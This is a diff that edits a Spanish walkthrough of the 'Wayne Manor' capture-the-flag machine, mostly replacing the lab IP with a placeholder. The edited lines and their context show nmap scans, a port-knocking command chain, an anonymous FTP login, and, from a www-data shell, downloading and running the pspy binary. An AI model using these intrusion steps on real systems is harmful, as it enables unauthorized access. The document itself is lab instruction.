@@ -26,7 +26,7 @@ Una vez tengamos acceso a la máquina y sepamos su dirección IP, escanearemos t
 
 ```sh
 ┌──(root💀kali)-[/home/kali]
-└─# nmap -sT -p- --open -T5 --min-rate 10000 -n 192.168.51.131 
+└─# nmap -sT -p- --open -T5 --min-rate 10000 -n <ip>
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 16:49 EDT
 Nmap scan report for 192.168.51.131
 Host is up (0.0012s latency).
@@ -41,7 +41,7 @@ Nmap done: 1 IP address (1 host up) scanned in 4.01 seconds
 ```
 ```sh
 ┌──(root💀kali)-[/home/kali]
-└─# nmap -sC -sV -p22,80 192.168.51.131 
+└─# nmap -sC -sV -p22,80 <ip>
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-11 16:50 EDT
 Nmap scan report for waynemanor.com (192.168.51.131)
 Host is up (0.00050s latency).
@@ -70,7 +70,7 @@ En base a los resultados obtenidos, accederemos a su página web, en la que podr
 ![](https://raw.githubusercontent.com/sec-balkan/Vulnerable_Machines/main/wayne_manor/img/publicacion.PNG)
 
 > Knock the door in front of the mansion.
-> Written by Bruce Wayne on September 19, 1939
+> Written by Bruce Wayne on September 19, 1939.
 
 > Alfred is warned to only let in about 300, 350, 400 people, but sometimes, if all those people come in, a secret room is opened, so people can Finish The Party.
 
@@ -79,14 +79,14 @@ Haciendo un poco de _guessing_ deducimos que hay que hacer _port knocking_ a los
 Primero, comprobaremos si está disponible el servicio _FTP_, después con _telnet_ enviaremos peticiones a los _3_ puertos, y después comprobaremos si el puerto _21_ se abre.
 
 ```sh
-nc -nv 192.168.51.131 21 || telnet 192.168.51.131 300 || telnet 192.168.51.131 350 || telnet 192.168.51.131 400 || nmap -sC -sV -p21 192.168.51.131
+nc -nv <ip> 21 || telnet <ip> 300 || telnet <ip> 350 || telnet <ip> 400 || nmap -sC -sV -p21 <ip>
 ```
 
 ```sh
 ┌──(root💀kali)-[/home/kali]
 └─#  <copypaste del comando anterior>
 
-192.168.51.131 400 || nmap -sC -sV -p21 192.168.51.131
+nc -nv <ip> 21
 (UNKNOWN) [192.168.51.131] 21 (ftp) : Connection refused
 
 Trying 192.168.51.131...
@@ -130,7 +130,7 @@ Una vez abierto, entramos gracias a el login anónimo, y en un archivo _.txt_ en
 
 ```sh
 ┌──(root💀kali)-[/home/kali]
-└─# ftp 192.168.51.131
+└─# ftp <ip>
 Connected to 192.168.51.131.
 220 (vsFTPd 3.0.3)
 Name (192.168.51.131:kali): anonymous
@@ -309,7 +309,7 @@ www-data@waynemanor:~/html/batflat/admin$
 
 Ahora con una shell como el usuario _www-data_ inciaremos la escalada de privilegios.
 
-A continuación nos descargaremos el binario de _pspy_ (una herramienta para la monitorización de procesos) y lo pondremos en escucha en el equipo para ver en tiempo real qué procesos se están ejecutando.
+A continuación nos descargaremos el binario de _pspy_ (herramienta para la monitorización de procesos) y lo pondremos en escucha en el equipo para ver en tiempo real qué procesos se están ejecutando.
 
 ```sh
 www-data@waynemanor:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
@@ -317,8 +317,7 @@ www-data@waynemanor:/tmp$ wget https://github.com/DominicBreuker/pspy/releases/d
 Resolving github.com (github.com)... 140.82.121.4
 Connecting to github.com (github.com)|140.82.121.4|:443... connected.
 HTTP request sent, awaiting response... 302 Found
-Location: https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210414%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210414T180654Z&X-Amz-Expires=300&X-Amz-Signature=999d7a8ebbb1cebb39f489cc831deefece89ad81c1f4c3711913aff26f582222&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream [following]
---2021-04-14 18:06:54--  https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20210414%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20210414T180654Z&X-Amz-Expires=300&X-Amz-Signature=999d7a8ebbb1cebb39f489cc831deefece89ad81c1f4c3711913aff26f582222&X-Amz-SignedHeaders=host&actor_id=0&key_id=0&repo_id=120821432&response-content-disposition=attachment%3B%20filename%3Dpspy64&response-content-type=application%2Foctet-stream
+Location: https://github-releases.githubusercontent.com/120821432/d54f2200-c51c-11e9-8d82-f178cd27b2cb?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-
 Resolving github-releases.githubusercontent.com (github-releases.githubusercontent.com)... 185.199.111.154, 185.199.108.154, 185.199.110.154, ...
 Connecting to github-releases.githubusercontent.com (github-releases.githubusercontent.com)|185.199.111.154|:443... connected.
 HTTP request sent, awaiting response... 200 OK
@@ -332,7 +331,7 @@ pspy64                                          100%[===========================
 www-data@waynemanor:/tmp$ chmod +x pspy64
 ```
 
-Ejecutamos el binario y nos irán apareciendo distintos procesos de distintos usuarios.
+Ejecutamos el binario y nos irán apareciendo distintos procesos de los distintos usuarios.
 
 ```sh
 www-data@waynemanor:/tmp$ ./pspy64
